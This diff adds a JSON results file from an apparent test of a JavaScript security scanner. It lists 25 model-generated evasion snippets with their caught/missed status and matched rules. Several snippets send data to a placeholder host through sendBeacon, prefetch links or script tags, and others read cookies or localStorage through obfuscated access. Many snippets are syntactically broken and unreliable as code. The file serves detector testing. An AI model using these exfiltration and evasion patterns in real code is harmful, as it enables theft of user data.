@@ -1,0 +1,248 @@
+{
+  "generated": "2026-02-17T20:38:29.616Z",
+  "model": "qwen2.5:14b",
+  "stats": {
+    "total": 25,
+    "caught": 15,
+    "missed": 10,
+    "catchRate": "60%"
+  },
+  "vectors": [
+    {
+      "category": "eval-bypass",
+      "code": "`const g = window['w']indow['g']lobalT[h]is; g['c']onsole.log('XORed', String.fromCharCode(...[73,78,69]));`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "ENCODED_PAYLOAD"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "eval-bypass",
+      "code": "`let a='atob';let b='btoa';let c='conso'+'le';window[a](b('SGVsbG8sIHdvcmxkIQ=='))[c].log('Hello, world!');`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "COMPUTED_PROPERTY_EXEC"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "eval-bypass",
+      "code": "`const p = new Proxy({}, { get: (t, k) => k === 'exec' ? Function : undefined }); p['eval']('console.log(\"Proxy trick\");');`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "PROXY_REFLECT_ABUSE",
+        "BRACKET_EVAL"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "eval-bypass",
+      "code": "`${(w=>{const a='conso';a+'le'.log('Template Literal')})(window)};`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "eval-bypass",
+      "code": "`Reflect.apply((g=globalThis)['c']onsole['l']og, g.console, ['Abusing Reflect']);`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "PROXY_REFLECT_ABUSE"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "sandbox-escape",
+      "code": "`const parentFrame = document.querySelector('frame, iframe').contentWindow.frameElement.parentNode.ownerGlobal;`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "CONTENT_WINDOW",
+        "FRAME_ELEMENT"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "sandbox-escape",
+      "code": "`window.postMessage({action: 'accessParent'}, '*');`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "POSTMESSAGE_WILDCARD"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "sandbox-escape",
+      "code": "`let ref = document.createElement('a'); document.documentElement.appendChild(ref); ref.click(); while (ref.host !== location.host) { ref = ref.parentElement; } const parentWin = ref.baseURI ? ref : ref.parentNode.ownerGlobal;`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "sandbox-escape",
+      "code": "`history.pushState({}, '', '#parentAccess'); window.dispatchEvent(new PopStateEvent('popstate'));`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "sandbox-escape",
+      "code": "`let frameDoc = document.querySelector('frame, iframe').contentWindow.document; while (frameDoc !== frameDoc.parent) { frameDoc = frameDoc.defaultView.top; }`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "CONTENT_WINDOW"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "data-exfiltration",
+      "code": "`document.createElement('link').setAttribute('rel', 'prefetch');document.querySelector('link[rel=\"prefetch\"]').href = 'http://example.com/data?' + encodeURIComponent(JSON.stringify({key: \"value\"}));`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "data-exfiltration",
+      "code": "`const img = document.createElement('img');img.src = 'data:image/png;base64,SGVsbG8sIHRoaXMgaXMgYSBkYXRhLWNvbm5lY3QgbW9kaWZpZXIuPC9pbWc+';document.body.appendChild(img);`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "data-exfiltration",
+      "code": "`navigator.sendBeacon('http://example.com/log', new Blob([JSON.stringify({key: \"value\"})], {type : 'application/json'}));`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "SEND_BEACON"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "data-exfiltration",
+      "code": "`const s = document.createElement('script');s.src = 'http://example.com/script.js?data=' + encodeURIComponent(JSON.stringify({key: \"value\"}));document.body.appendChild(s);`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "data-exfiltration",
+      "code": "`link = document.createElement(\"link\");link.rel=\"preconnect\";link.href=\"https://example.com/?data=\" + btoa(unescape(encodeURIComponent(\"{key:value}\")));document.head.append(link);`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "ENCODED_PAYLOAD",
+        "DNS_PREFETCH_EXFIL"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "prototype-pollution",
+      "code": "`Object.defineProperty(this, 'constructor', { value: function() {}, writable: true }); this.constructor.prototype污染属性 = 'polluted';`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "PROTOTYPE_POLLUTION"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "prototype-pollution",
+      "code": "`Reflect.construct(Function.prototype.bind, [this], Function)['prototype'].敏感方法 = 'bypassed';`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "PROXY_REFLECT_ABUSE"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "prototype-pollution",
+      "code": "`const s = Symbol('proto'); Object[s]({}) = {}; Object[s](Object[s](Function)['prototype'])['pollution'] = 'yes';`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "prototype-pollution",
+      "code": "`let obj = Object.create(Object.getPrototypeOf(Function)); obj.prototype['sneakyPollution'] = 'hacked'; Function.prototype = obj;`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "prototype-pollution",
+      "code": "`const fn = (target, key) => Object.defineProperty(target, key, { value: () => {}, writable: true }); fn(this.constructor.prototype, 'undetected') = 'exploit';`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "PROTOTYPE_POLLUTION"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "cookie-storage-theft",
+      "code": "`const d = 'document'; console.log([][d]['cookie']);`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "cookie-storage-theft",
+      "code": "`let l = 'L'.toLowerCase() + 'o' + 'calS' + 'torage'; console.log(window[l].getItem('key'));`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "COMPUTED_PROPERTY_EXEC"
+      ],
+      "severity": "warning"
+    },
+    {
+      "category": "cookie-storage-theft",
+      "code": "`var objKeys = Object.keys(document)[Object.keys({}).indexOf('0')]; console.log(objKeys['cookie']);`",
+      "shouldFlag": true,
+      "caught": false,
+      "matchedRules": [],
+      "severity": "missed"
+    },
+    {
+      "category": "cookie-storage-theft",
+      "code": "`(new Proxy({}, { get: (_, prop) => (prop === 'document.cookie') ? document.cookie : undefined })).document.cookie;`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "DOCUMENT_COOKIE",
+        "DOCUMENT_COOKIE",
+        "DOCUMENT_COOKIE",
+        "PROXY_REFLECT_ABUSE"
+      ],
+      "severity": "critical"
+    },
+    {
+      "category": "cookie-storage-theft",
+      "code": "`let w = 'window'; let s = 'lS' + String.fromCharCode(116,97,114); console.log(w[s]['item']('key'));`",
+      "shouldFlag": true,
+      "caught": true,
+      "matchedRules": [
+        "ENCODED_PAYLOAD"
+      ],
+      "severity": "warning"
+    }
+  ]
+}
